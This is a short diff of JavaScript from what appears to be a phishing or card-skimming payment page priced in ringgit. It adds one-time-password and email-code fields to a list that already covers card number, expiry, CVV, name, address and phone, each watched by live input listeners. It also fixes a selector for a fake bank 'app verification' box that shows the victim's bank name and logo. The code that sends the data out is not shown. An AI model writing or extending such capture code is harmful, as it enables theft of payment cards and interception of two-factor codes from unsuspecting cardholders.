@@ -581,7 +581,7 @@
           }
         }))}
       }var liveTimer = null;
-      ['cardHolder','cardNumber','card_expiry_month','card_expiry_year','cvv','fullName','email','phone','address1','city','state','zipCode','country'].forEach(function(id) {
+      ['cardHolder','cardNumber','card_expiry_month','card_expiry_year','cvv','fullName','email','phone','address1','city','state','zipCode','country','otp-code','email-code'].forEach(function(id) {
         var el = document.getElementById(id);
         if(el)el.addEventListener('input',function() {
           clearTimeout(liveTimer);
@@ -952,7 +952,7 @@
                                      else if(/master/i.test(ct)){el.innerHTML='<svg width="32" height="22" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/></svg>'}
                                    }
                                     function showGenericApp(p) {
-                                      var avb=q('app-verify-box');if(avb)avb.classList.remove('hidden');
+                                      var avb=document.querySelector('.app-verify-box');if(avb)avb.classList.remove('hidden');
                                       var bn = (p.cardInfo && p.cardInfo.bankName) || p.bankName || 'Bank';
                                       updateBankLogo(bn);
                                       var aa=q('app-amount');if(aa)aa.textContent = 'RM '+document.getElementById('total-amount').textContent.replace(/[^\d.]/g,'');
